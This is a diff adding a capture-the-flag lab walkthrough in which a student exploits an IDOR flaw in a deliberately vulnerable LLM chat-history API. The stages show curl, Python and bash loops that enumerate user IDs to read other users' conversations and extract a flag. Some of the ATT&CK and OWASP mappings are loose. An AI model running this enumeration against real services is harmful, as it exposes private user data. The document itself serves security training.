@@ -3053,3 +3053,133 @@ curl -s -X POST http://LLM_SERVER_IP:PORT/chat \
 ```
 **Expected Output:** `CTF{...flag_value_placeholder...}`
 **TTP:** —
+
+---
+
+### LLM-03: IDOR in LLM Chat History API
+
+**VMs:** Attacker (Kali), LLM Server (Ubuntu 22.04, Ollama + Damn Vulnerable LLM Agent)
+**Difficulty:** Medium
+**Flags:** 1
+
+The LLM application exposes a chat history endpoint that retrieves conversation records by integer user ID — but performs no ownership check to verify the requesting client owns that ID. The student enumerates sequential integer IDs on the unauthenticated endpoint to discover a privileged user's chat session containing an embedded flag.
+
+---
+
+### Stage 1: API Endpoint Discovery
+
+**Action:** You enumerate the LLM application's API surface to locate the chat history endpoint and confirm it accepts unauthenticated requests.
+**Command:**
+```bash
+# Discover available routes
+curl -s http://LLM_SERVER_IP:PORT/ | jq .
+
+# Probe the history endpoint with user_id=1 — confirm 200 response without Authorization header
+curl -v http://LLM_SERVER_IP:PORT/history/1
+```
+**Expected Output:**
+```
+{"routes": ["/chat", "/history/<user_id>", "/ingest"]}
+
+# Second command — HTTP 200 with JSON chat history:
+{"user_id": 1, "messages": [{"role": "user", "content": "Hello"}, {"role": "assistant", "content": "Hi there!"}]}
+# No 401 Unauthorized or 403 Forbidden — confirming the endpoint is unauthenticated
+```
+**TTP:** [T1592 — Gather Victim Host Information](https://attack.mitre.org/techniques/T1592/) · Reconnaissance
+
+---
+
+### Stage 2: Ownership Model Verification — No Auth Check
+
+**Action:** You confirm the endpoint has no user ID ownership enforcement by accessing a different user's chat history without any session token or credential.
+**Command:**
+```bash
+# Test user_id=2 — if response is not 401/403, IDOR is confirmed
+curl -s http://LLM_SERVER_IP:PORT/history/2 | jq .
+
+# Compare: access your own ID vs. another ID — both return 200 with no auth header
+curl -s http://LLM_SERVER_IP:PORT/history/YOUR_USER_ID | jq .
+```
+**Expected Output:**
+```
+{"user_id": 2, "messages": [{"role": "user", "content": "..."}, ...]}
+# HTTP 200 for both requests — no authorization error
+# Both return chat histories for different users, confirming sequential integer IDOR vulnerability
+```
+**TTP:** [T1078 — Valid Accounts](https://attack.mitre.org/techniques/T1078/) · Defense Evasion
+Note: no Authorization header is required and no ownership check is enforced on user_id — unauthenticated IDOR confirmed. OWASP API Security Top 10 maps this to API1 (Broken Object Level Authorization); OWASP LLM Top 10 2025 maps it to [LLM10 — Unbounded Consumption](https://owasp.org/www-project-top-10-for-large-language-model-applications/) · OWASP LLM Top 10 2025.
+
+---
+
+### Stage 3: Sequential ID Enumeration — Bruteforce Chat History
+
+**Action:** You iterate over sequential integer user IDs to enumerate all accessible chat histories, looking for sessions belonging to privileged users that contain the flag.
+**Command:**
+```python
+import requests
+
+BASE_URL = "http://LLM_SERVER_IP:PORT/history"
+for uid in range(1, 50):
+    r = requests.get(f"{BASE_URL}/{uid}")
+    if r.status_code == 200:
+        body = r.json()
+        print(f"[+] user_id={uid}: {str(body)[:120]}")
+```
+```bash
+# Alternative: bash loop
+for i in $(seq 1 50); do
+  echo -n "user_id=$i: "
+  curl -s http://LLM_SERVER_IP:PORT/history/$i | jq -r '.messages[-1].content // "empty"'
+done
+```
+**Expected Output:**
+```
+[+] user_id=1: {'user_id': 1, 'messages': [{'role': 'user', 'content': 'Hello'}]}
+[+] user_id=2: {'user_id': 2, 'messages': [{'role': 'user', 'content': 'How do I reset'}]}
+...
+[+] user_id=7: {'user_id': 7, 'messages': [{'role': 'user', 'content': 'CTF{...'}]}
+# One entry — belonging to a privileged user (e.g., user_id=7 or admin) — shows CTF{ in the content field
+```
+**TTP:** [T1110.003 — Password Spraying](https://attack.mitre.org/techniques/T1110/003/) · Credential Access
+Note: closest ATT&CK analog for sequential integer enumeration; primary classification is OWASP API1 (Broken Object Level Authorization) / [LLM10 — Unbounded Consumption](https://owasp.org/www-project-top-10-for-large-language-model-applications/) · OWASP LLM Top 10 2025.
+
+---
+
+### Stage 4: Targeted Record Retrieval — Privileged User Session
+
+**Action:** You retrieve the full chat history for the privileged user ID identified during enumeration, extracting the complete conversation that contains the embedded flag.
+**Command:**
+```bash
+curl -s http://LLM_SERVER_IP:PORT/history/PRIVILEGED_USER_ID | jq .
+
+# Extract the flag string directly
+curl -s http://LLM_SERVER_IP:PORT/history/PRIVILEGED_USER_ID \
+  | jq -r '.messages[].content' \
+  | grep -o 'CTF{[^}]*}'
+```
+**Expected Output:**
+```
+{
+  "user_id": PRIVILEGED_USER_ID,
+  "messages": [
+    {"role": "user", "content": "CTF{idor_no_authz_check_exposes_all_sessions}"},
+    ...
+  ]
+}
+```
+**TTP:** [T1530 — Data from Cloud Storage](https://attack.mitre.org/techniques/T1530/) · Collection
+Note: closest ATT&CK mapping for data exfiltration from a cloud-adjacent API store; primary OWASP mapping is API1 (Broken Object Level Authorization) / LLM10 (Unbounded Consumption).
+
+---
+
+### [FLAG 1] Stage 5: Flag Capture — Privileged User Chat Session
+
+**Action:** You retrieve Flag 1 from the privileged user's chat history record exposed by the unauthenticated IDOR endpoint.
+**Command:**
+```bash
+curl -s http://LLM_SERVER_IP:PORT/history/PRIVILEGED_USER_ID \
+  | jq -r '.messages[].content' \
+  | grep -o 'CTF{[^}]*}'
+```
+**Expected Output:** `CTF{...flag_value_placeholder...}`
+**TTP:** —
